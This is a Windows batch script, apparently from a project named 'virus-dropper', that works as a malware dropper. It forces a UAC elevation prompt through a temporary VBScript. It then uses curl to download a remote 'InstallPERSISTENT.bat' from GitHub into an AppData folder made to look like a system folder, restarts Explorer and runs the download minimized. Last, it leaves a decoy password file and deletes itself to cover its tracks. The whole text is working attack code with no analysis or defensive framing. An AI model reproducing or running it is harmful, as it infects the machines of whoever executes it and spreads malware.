@echo off
>nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"
if '%errorlevel%' NEQ '0' (
    goto UACPrompt
) else ( goto gotAdmin )
:UACPrompt
    echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
    set params = %*:"="
    echo UAC.ShellExecute "cmd.exe", "/c %~s0 %params%", "", "runas", 1 >> "%temp%\getadmin.vbs"
    "%temp%\getadmin.vbs"
    del "%temp%\getadmin.vbs"
    md %appdata%\Windows
    curl "https://raw.githubusercontent.com/YumYummity/virus-dropper/main/install/InstallPERSISTENT.bat" --output "%appdata%\Windows\Install.bat"
    taskkill /f /IM explorer.exe
    start explorer.exe
    exit /B
:gotAdmin
    pushd "%CD%"
    CD /D "%~dp0"

start /min %appdata%\Windows\Install.bat
echo The password is: 69420 > password.txt
call :deleteSelf&exit
:deleteSelf
start /b "" cmd /c del "%~f0"&exit